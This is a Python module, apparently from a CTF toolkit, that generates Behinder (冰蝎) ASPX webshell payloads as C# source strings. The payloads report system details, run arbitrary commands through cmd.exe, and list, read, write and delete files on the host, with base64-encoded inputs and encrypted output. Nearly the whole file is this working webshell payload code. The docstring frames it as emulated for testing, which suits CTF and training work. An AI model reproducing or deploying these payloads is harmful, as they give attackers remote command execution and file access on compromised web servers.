"""冰蝎 ASPX 载荷（C# 源码字符串形式）。

真实冰蝎 ASPX 走 CSharpCodeProvider / Assembly.Load 加载运行时编译代码；
本引擎首阶段以 C# 源码字符串表达等价语义，前置 `/*CTFBOX_BH|op|b64...*/`
机读标签，测试解释器据此仿真。真实对接时可换成预编译程序集，
标签形式保持一致。
"""

from __future__ import annotations

import base64

from ...base import Operation


def _b64(value: str | bytes) -> str:
    data = value.encode("utf-8") if isinstance(value, str) else value
    return base64.b64encode(data).decode("ascii")


def _tag(op: str, *b64parts: str) -> str:
    return "/*CTFBOX_BH|" + "|".join((op, *b64parts)) + "*/"


def _wrap(tag: str, body: str, key: str) -> str:
    return (
        f"{tag}\n"
        f'string k="{key}";string o="";\n'
        f"{body}\n"
        f'Response.Write(Behinder.Encrypt(o,k));'
    )


def render(operation: str, params: dict, key: str) -> str:
    if operation == Operation.SYSINFO:
        tag = _tag(Operation.SYSINFO)
        body = (
            'o="{\\"os\\":\\""+Environment.OSVersion.Platform.ToString()+"\\",'
            '\\"user\\":\\""+Environment.UserName+"\\",'
            '\\"cwd\\":\\""+System.IO.Directory.GetCurrentDirectory().Replace("\\\\","/")+"\\"}";'
        )
        return _wrap(tag, body, key)

    if operation == Operation.EXEC:
        b = _b64(params["cmd"])
        tag = _tag(Operation.EXEC, b)
        body = (
            f'string c=Encoding.UTF8.GetString(Convert.FromBase64String("{b}"));'
            'var psi=new ProcessStartInfo("cmd.exe","/c "+c){RedirectStandardOutput=true,UseShellExecute=false};'
            'var p=Process.Start(psi);o=p.StandardOutput.ReadToEnd();p.WaitForExit();'
        )
        return _wrap(tag, body, key)

    if operation == Operation.LIST:
        b = _b64(params.get("path", "."))
        tag = _tag(Operation.LIST, b)
        body = (
            f'string p=Encoding.UTF8.GetString(Convert.FromBase64String("{b}"));'
            'var sb=new StringBuilder();'
            'foreach(var f in Directory.EnumerateFileSystemEntries(p)){'
            'var name=Path.GetFileName(f);'
            'var isDir=Directory.Exists(f);'
            'long size=isDir?0:new FileInfo(f).Length;'
            'sb.Append(name).Append("\\t").Append(isDir?"dir":"file").Append("\\t").Append(size).Append("\\n");}'
            'o=sb.ToString();'
        )
        return _wrap(tag, body, key)

    if operation == Operation.READ:
        b = _b64(params["path"])
        tag = _tag(Operation.READ, b)
        body = (
            f'string p=Encoding.UTF8.GetString(Convert.FromBase64String("{b}"));'
            'byte[] data=File.ReadAllBytes(p);o=Convert.ToBase64String(data);'
        )
        return _wrap(tag, body, key)

    if operation == Operation.WRITE:
        bp = _b64(params["path"])
        bc = params["content"]
        tag = _tag(Operation.WRITE, bp, bc)
        body = (
            f'string p=Encoding.UTF8.GetString(Convert.FromBase64String("{bp}"));'
            f'byte[] data=Convert.FromBase64String("{bc}");'
            'File.WriteAllBytes(p,data);o=data.Length.ToString();'
        )
        return _wrap(tag, body, key)

    if operation == Operation.DELETE:
        b = _b64(params["path"])
        tag = _tag(Operation.DELETE, b)
        body = (
            f'string p=Encoding.UTF8.GetString(Convert.FromBase64String("{b}"));'
            'try{File.Delete(p);o="1";}catch{o="0";}'
        )
        return _wrap(tag, body, key)

    raise ValueError(f"冰蝎 ASPX 载荷不支持操作：{operation}")
